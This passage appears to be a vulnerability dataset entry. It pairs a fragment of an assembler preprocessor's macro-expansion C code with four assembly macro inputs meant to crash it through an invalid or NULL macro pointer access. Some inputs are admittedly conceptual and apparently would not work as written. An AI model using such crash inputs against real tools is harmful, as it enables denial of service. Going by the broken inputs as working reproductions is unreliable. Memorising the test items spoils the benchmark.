m->expansion; t; t = t->next) { if (t->type >= TOK_SMAC_PARAM) { Token *pcopy = tline, **ptail = &pcopy; Token *ttt, *pt; int i; ttt = params[t->type - TOK_SMAC_PARAM]; for (i = paramsize[t->type - TOK_SMAC_PARAM]; --i >= 0;) { pt = *ptail = new_Token(tline, ttt->type, ttt->text, 0); ptail = &pt->next; ttt = ttt->next; } tline = pcopy; } else { tt = new_Token(tline, t->type, t->text, 0); tline = tt; } } nasm_free(params); nasm_free(paramsize); free_tlist(mstart); continue; } } } if (tline->type == TOK_SMAC_END) { tline->mac->in_progress = FALSE; tline = delete_Token(tline); } else { t = *tail = tline; tline = tline->next; t->mac = NULL; t->next = NULL; tail = &t->next; } } t = thead; rescan = 0; while (t) { while (t && t->type != TOK_ID && t->type != TOK_PREPROC_ID) t = t->next; if (!t || !t->next) break; if (t->next->type == TOK_ID || t->next->type == TOK_PREPROC_ID || t->next->type == TOK_NUMBER) { char *p = nasm_strcat(t->text, t->next->text); nasm_free(t->text); t->next = delete_Token(t->next); t->text = p; rescan = 1; } else if (t->next->type == TOK_WHITESPACE && t->next->next && t->next->next->type == TOK_PREPROC_ID && strcmp(t->next->next->text, \""%+\"") == 0) { int i; for (i = 1; i <= 3; i++) { if (!t->next || (i != 2 && t->next->type != TOK_WHITESPACE)) break; t->next = delete_Token(t->next); } } else t = t->next; } if (rescan) { tline = thead; goto again; } if (org_tline) { if (thead) { *org_tline = *thead; thead->text = NULL; delete_Token(thead); } else { memset(org_tline, 0, sizeof(*org_tline)); org_tline->text = NULL; org_tline->type = TOK_WHITESPACE; } thead = org_tline; } return thead; }","%macro crash_macro 0
+    %rep 1
+        %assign %$i 0
+        %rep 1
+            %ifidn __FILE__, __FILE__
+                %rotate 1
+                %exitrep
+            %endif
+        %endrep
+    %endrep
+%endmacro
+
+%macro trigger_crash 0
+    crash_macro
+    %rep 1
+        %ifidn __FILE__, __FILE__
+            %rotate 1
+            %exitrep
+        %endif
+    %endrep
+%endmacro
+
+trigger_crash",vul29_1
+,"%macro trigger_expand_smacro_error 0
+    %define TOK_ID 1
+    %define TOK_PREPROC_ID 2
+    %define TOK_WHITESPACE 3
+    %define TOK_OTHER 4
+    %define TOK_STRING 5
+    %define TOK_NUMBER 6
+
+    %struc fake_token
+        .type resb 1
+        .text resb 8
+        .mac resb 8
+    %endstruc
+
+    %struc fake_smacro
+        .in_progress resb 1
+    %endstruc
+
+    ;; Create a fake token that simulates a macro call
+    %assign %$token fake_token
+    %assign %$smacro fake_smacro
+
+    ;; Incorrectly set up the token to point to a macro structure
+    [SECTION .data]
+    token_instance:    resb fake_token_size
+    smacro_instance:   resb fake_smacro_size
+
+    ;; Simulate a macro in progress
+    mov byte [smacro_instance+fake_smacro.in_progress], 1
+
+    ;; Point the token's mac field to our fake macro
+    mov rax, smacro_instance
+    mov [token_instance+fake_token.mac], rax
+
+    ;; Set the token type to simulate a macro end (this should not be a valid scenario)
+    mov byte [token_instance+fake_token.type], TOK_ID  ; Simulate an identifier token
+
+    ;; Trigger the function with the crafted token
+    ;; This should access t->mac->in_progress where t is our crafted token
+    ;; The goal is to cause a segmentation fault due to invalid memory access
+%endmacro
+
+trigger_expand_smacro_error",vul29_2
+,"%macro trigger_null_pointer 0
+    ; Simulate a scenario where t->mac might be NULL
+    ; This is a conceptual representation and may not directly correspond to actual memory manipulation in YASM
+    %define t.mac NULL
+    %assign t.type TOK_SMAC_END
+    %rep 1
+        ; Force the execution path to hit the vulnerable line
+        mov ebx, [t.mac]  ; ebx is used hypothetically to represent accessing t->mac
+        mov [ebx], FALSE  ; This represents t->mac->in_progress = FALSE
+    %endrep
+%endmacro
+
+trigger_null_pointer",vul29_3
+,"%macro crash_macro 0
+    %rep 1
+        %assign %$i 0
+        %rep 1
+            %ifidn __FILE__, __FILE__
+                %rotate 1
+                %exitrep
+            %endif
+        %endrep
+    %endrep
+%endmacro
+
+crash_macro",vul29_4
